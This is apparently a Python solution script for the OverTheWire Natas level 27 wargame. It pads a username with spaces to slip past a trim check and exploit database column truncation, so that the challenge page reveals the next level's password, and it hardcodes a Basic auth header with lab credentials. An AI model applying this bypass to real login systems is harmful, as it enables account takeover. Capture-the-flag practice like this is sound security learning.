import requests

# Base URL
url = 'http://natas27.natas.labs.overthewire.org'

# Function to make two GET requests (first one to create the user, second one - to get the info)
def send_2_get_requests():

    # Our parameters to pass $usr != trim($usr) check
    params = dict(username="natas28"+" " * 57 + "x", password="")
    
    headers = {
        'Authorization': 'Basic bmF0YXMyNzpQU084eHlzUGkwMFdLSWlaWjZzNlB0Um1GeTljYnhqMw==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas27.natas.labs.overthewire.org',
        'Referer': 'http://natas27.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request with out params
    response = requests.post(url, headers=headers, params=params)

    # This will pass `validUser` and `checkCredentials` checks
    # And `dumpData` will trim the username (natas28 + spaces -> natas28)
    params = dict(username="natas28"+" " * 57, password="")

    # Make the second POST request with new params
    response = requests.post(url, headers=headers, params=params)

    return response.text

response = send_2_get_requests()
print(response)